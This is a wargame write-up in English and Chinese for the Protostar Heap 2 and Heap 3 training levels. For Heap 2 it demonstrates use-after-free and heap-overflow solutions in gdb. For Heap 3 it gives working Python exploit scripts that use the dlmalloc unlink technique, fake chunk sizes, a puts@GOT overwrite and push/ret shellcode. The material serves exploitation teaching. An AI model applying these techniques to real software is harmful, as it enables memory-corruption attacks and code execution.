# Protostar: Heap 2

This level examines what can happen when heap pointers are stale.

This level is completed when you see the “you have logged in already!” message.

This level is at `/opt/protostar/bin/heap2`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```



## 攻击目标

使程序打印`you have logged in already!`。



## 攻击过程

```shell
# UFA方法
$ ./heap2
[ auth = (nil), service = (nil) ]
auth alice
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service 111
[ auth = 0x804c008, service = 0x804c008 ]
service 222
[ auth = 0x804c008, service = 0x804c018 ]
service 333
[ auth = 0x804c008, service = 0x804c028 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c028 ]
```

<img src=".\heap2-result.png" style="zoom:67%;" />



## 原理分析

### 方法一：UFA

分析源码可知，如果程序正常运行，则源码从未修改`auth->auth`，程序不会输出`you have logged in already!`。

```shell
(gdb) r
[ auth = (nil), service = (nil) ]
auth alice
[ auth = 0x804c008, service = (nil) ]
^C
```

<img src=".\heap2-analysis-1.png" style="zoom:67%;" />

`auth`数据部分起始地址为0x804c008。

```shell
(gdb) info proc map # 查看堆起始地址
```

<img src=".\heap2-analysis-2.png" style="zoom:67%;" />

堆起始地址为0x804c000。

```shell
(gdb) x/24wx 0x804c000 # 查看堆上内容 可以看到0x804c008处的auth->name = alice
```

<img src=".\heap2-analysis-3.png" style="zoom:67%;" />

0x00000011表示`auth`块长度，最后一位为标识符，表示这一块是否free，所以本块长度为0x10 = 16B，前8B为head，后8B为数据。

```shell
auth = malloc(sizeof(auth));
```

源码中的这一行为`auth`分配一个指针大小的空间，4B。因为malloc有一个对齐机制，所以最终分配了8B。

继续执行程序。

```
(gdb) c
reset
[ auth = 0x804c008, service = (nil) ]
^C
(gdb) x/24wx 0x804c000
```

<img src=".\heap2-analysis-4.png" style="zoom:67%;" />

可以看到0x804c008位置存储的alice被清空了。会有一些残留数据，但并不影响，对于堆管理器来说这一部分都是可用的。

```
(gdb) c
service 111
[ auth = 0x804c008, service = 0x804c008 ]
^C
(gdb) x/24wx 0x804c000
```

<img src=".\heap2-analysis-5.png" style="zoom:67%;" />

可以看到，因为auth（struct auth *）指针仍然有效，指向地址0x804c008，但其对应的堆上的块已经被清空了，处于可用状态，所以现在堆管理器把这一块分配给了service 111 = " 111"。

```
(gdb) c
service 222
[ auth = 0x804c008, service = 0x804c018 ]
^C
(gdb) x/24wx 0x804c000
```

<img src=".\heap2-analysis-6.png" style="zoom:67%;" />

可以看到service 222 = " 222"的位置。

```
(gdb) c
service 333
[ auth = 0x804c008, service = 0x804c028 ]
^C
(gdb) x/24wx 0x804c000
```

<img src=".\heap2-analysis-7.png" style="zoom:67%;" />

可以看到service 333 = " 333"的位置。

```
(gdb) c
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c028 ]
```

<img src=".\heap2-analysis-8.png" style="zoom:67%;" />

因为`auth`（struct auth *）指针依然有效，所以当利用它访问`auth->auth`时，它依然按照结构体的声明，将起始地址后32B视为`auth->name`（chat [32]），接下来（从0x804c028开始）的4B视为`auth->auth`（int）。当我们在堆上分配service 333（char\*）即字符串“ 333”时，它刚好覆盖在了被视为`auth->auth`的位置。所以可以使程序通过if校验，打印`you have logged in already!`。

这是一个典型的use-after-free漏洞，这类漏洞可能会造成程序逻辑上的错误，也可能造成内存信息的泄露，是一类非常危险的漏洞。



### 方法二：简单堆溢出

``` shell
(gdb) r
[ auth = (nil), service = (nil) ]
auth alice
[ auth = 0x804c008, service = (nil) ]
service 1112222333344445
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
^C
(gdb) x/24wx 0x804c000
```

<img src=".\heap2-analysis-9.png" style="zoom:67%;" />

利用`auth`（struct auth *）指针访问`auth->auth`时，它按照结构体的声明，将起始地址（0x804c008）后32B视为`auth->name`（chat [32]），接下来（从0x804c028开始）的4B视为`auth->auth`（int）。而service（char\*）被分配的空间从0x804c018开始，我们只需要将其赋值为16B以上，它就能覆盖到被视为`auth->auth`的位置，使程序通过if校验，打印`you have logged in already!`。

<div STYLE="page-break-after: always;"></div>

# Protostar: Heap 3

This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.

This level is at `/opt/protostar/bin/heap3`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```



## 攻击目标

构造堆溢出，改变程序控制流，让`winner()`函数执行。



## 攻击过程

```shell
# 利用a的堆溢出
$ cat heap3_a.py
a = "A" * 4
a += "\x68\x64\x88\x04\x08\xc3"
a += "A" * 22
a += "\xf8\xff\xff\xff"
a += "\xfc\xff\xff\xff"

b = "A" * 8
b += "\x1c\xb1\x04\x08"
b += "\x0c\xc0\x04\x08"

c = "C" * 4

print a + " " + b + " " + c
$ ./heap3 `python heap3_a.py`
that wasn't too bad now, was it? @ 1711920093
```

<img src=".\heap3-result-1.png" style="zoom:67%;" />



```shell
# 利用b的堆溢出
$ cat heap3_b.py
a = "A" * 4
a += "\x68\x64\x88\x04\x08\xc3"

b = "A" * 32
b += "\xf8\xff\xff\xff"
b += "\xfc\xff\xff\xff"
b += "B" * 8
b += "\x1c\xb1\x04\x08"
b += "\x0c\xc0\x04\x08"

c = "C" * 4

print a + " " + b + " " + c
$ ./heap3 `python heap3_b.py`
that wasn't too bad now, was it? @ 1711920372
```

<img src=".\heap3-result-2.png" style="zoom:67%;" />



## 原理分析：unlink

+ malloc()：一个由标准C库提供的在堆（heap）上<u>动态分配管理内存</u>的函数。

+ chunk：malloc()创建和管理的一个个内存块；

  + 用户使用中的叫做 allocated chunk；
  + 被用户释放，处于空闲的叫做 free chunk。

  <img src=".\heap3-analysis-1.png" style="zoom:67%;" />

+ bin：组织管理 free chunk 的双向链表。

+ unlink：把一个 free chunk 从所在 bin 中删除的过程。

malloc()与free()的原理如下图所示：

<img src=".\heap3-analysis-2.png" style="zoom:67%;" />

当释放d时，因为，会发生以下操作：

<img src=".\heap3-analysis-3.png" style="zoom:67%;" />

unlink(e)的过程：

1. 循着e的*fd定位到b；
2. 循着e的*bk定位到x；
3. 向b的*bk字段写入x的地址；
4. 向x的*fd字段写入b的地址。

<img src=".\heap3-analysis-4.png" style="zoom:67%;" />

实际上在unlink后，e的*fd仍然指向b，\*bk仍然指向x，但没有任何指针指向e，所以e在逻辑上已经消失。

**此处存在exploit的机会**：

如果在e的*fd处构造地址\*p，\*bk处构造地址\*q，上述unlink(e)会变成：

1. 循着e的*fd定位到【（b的起始地址→）\*p】；
2. 循着e的*bk定位到【（x的起始地址→）\*q】；
3. 向【（b的*bk字段→）\*p下偏移若干（12）字节处】写入【（x的起始地址→）\*q】；
4. 向【（x的*fd字段→）\*q下偏移若干（8）字节处】写入【（b的起始地址→）\*p】。

<img src=".\heap3-analysis-5.png" style="zoom:67%;" />

如此一来，只要我们将\*p构造成eip会到达的某个函数的跳转地址-12，将\*q构造成一段shellcode的入口地址，就可以将那个函数的跳转地址覆写为shellcode的入口地址。这样eip在想要利用跳转地址跳转到那个函数时，会跳转到shellcode。本题中我们可以利用`printf()`函数。同时\*p也会写到\*q+8处，所以我们只有8B的空间来写shellcode。

<img src=".\heap3-analysis-6.png" style="zoom:67%;" />

查看`winner()`函数的入口地址：

```shell
(gdb) p winner
```

<img src=".\heap3-analysis-9.png" style="zoom:67%;" />

为了让eip能跳转到`winner()`，我们可以利用以下两段指令：

```ruby
push 0x08048864	# 将winner的入口地址压到栈顶
ret	# ret会将栈顶存储的值作为返回地址赋值给eip
```

以上指令对应的shellcode为：\x68\x64\x88\x04\x08\xc3。

查看汇编代码：

<img src=".\heap3-disas-1.png" style="zoom:67%;" />

<img src=".\heap3-disas-2.png" style="zoom:67%;" />

查看`printf()`对应的系统调用puts的跳转地址：

```shell
(gdb) disas 0x8048790
```

<img src=".\heap3-analysis-10.png" style="zoom:67%;" />

puts@GOT - 12 = 0x804b128 - 0xc = 0x0804b11c

在free前打断点，先正常执行。

```shell
(gdb) r AAAA BBBB CCCC
```

查找堆起始地址：

```shell
(gdb) info proc map # 为0x804c000
```

<img src=".\heap3-analysis-11.png" style="zoom:67%;" />

查看堆上内容：

```shell
(gdb) x/64wx 0x804c000
```

<img src=".\heap3-analysis-12.png" style="zoom:67%;" />

a块起始地址为0x804c000，b块起始地址为0x804c028，c块起始地址为0x804c050。

### 方法一：利用a的堆溢出

原理图如下：

<img src=".\heap3-analysis-7.png" style="zoom:67%;" />

0xfffffffc是我们设计的b的size，要尽可能大以触发unlink，且不能含有00，因为`strcpy()`遇到00会截断；0xfffffff8（0100结尾）是我们设计的fake chunk的size。

从\*b+8开始的fake chunk被当成是b的前一块，发生unlink(fake)。

<img src=".\heap3-analysis-8.png" style="zoom:67%;" />

0x0804b11c是我们设计的fake chunk的\*fd，即\*p，指向puts的跳转地址-12；0x0804b00c是我们设计的fake chunk的\*bk，即\*q，指向shellcode的入口地址。

由堆溢出的内存分布图与正常执行的内存分布图的对照，可构造攻击脚本：

```python
# heap3_a.py
# exploit a overflow
a = "A" * 4
a += "\x68\x64\x88\x04\x08\xc3" # shellcode
a += "A" * 22
# overflow into b
a += "\xf8\xff\xff\xff" # a块的size（伪）
a += "\xfc\xff\xff\xff" # b块的size（伪）

b = "A" * 8
b += "\x1c\xb1\x04\x08" # puts@GOT - 12
b += "\x0c\xc0\x04\x08" # shellcode入口地址

c = "CCCC"

print a + " " + b + " " + c
```

下面在gdb中观察攻击过程，分别打以下四个断点。

```shell
(gdb) b *0x08048911 # free(c)
(gdb) b *0x0804891d # free(b)
(gdb) b *0x08048929 # free(a)
(gdb) b *0x08048935 # puts
```

运行，分别查看堆上情况。

```
(gdb) x/64wx 0x804c000
```

Breakpoint 1：

<img src=".\heap3-analysis-13.png" style="zoom:67%;" />

Breakpoint 2：

<img src=".\heap3-analysis-14.png" style="zoom:67%;" />

Breakpoint 3：

<img src=".\heap3-analysis-15.png" style="zoom:67%;" />

Breakpoint 4：

<img src=".\heap3-analysis-16.png" style="zoom:67%;" />



### 方法二：利用b的堆溢出

原理类似方法一，构造的攻击脚本如下：

```python
# heap3_b.py
# exploit b overflow
a = "A" * 4
a += "\x68\x64\x88\x04\x08\xc3" # shellcode

b = "A" * 32
# overflow into c
b += "\xf8\xff\xff\xff" # b块的size（伪）
b += "\xfc\xff\xff\xff" # c块的size（伪）
b += "B" * 8
b += "\x1c\xb1\x04\x08" # puts@GOTS - 12
b += "\x0c\xc0\x04\x08" # shellcode入口地址

c = "CCCC"

print a + " " + b + " " + c
```

下面在gdb中观察攻击过程，分别打以下四个断点。

```shell
(gdb) b *0x08048911 # free(c)
(gdb) b *0x0804891d # free(b)
(gdb) b *0x08048929 # free(a)
(gdb) b *0x08048935 # puts
```

运行，分别查看堆上情况。

```
(gdb) x/64wx 0x804c000
```

Breakpoint 1：

<img src=".\heap3-analysis-17.png" style="zoom:67%;" />

Breakpoint 2：

<img src=".\heap3-analysis-18.png" style="zoom:67%;" />

Breakpoint 3：

<img src=".\heap3-analysis-19.png" style="zoom:67%;" />

Breakpoint 4：

<img src=".\heap3-analysis-20.png" style="zoom:67%;" />

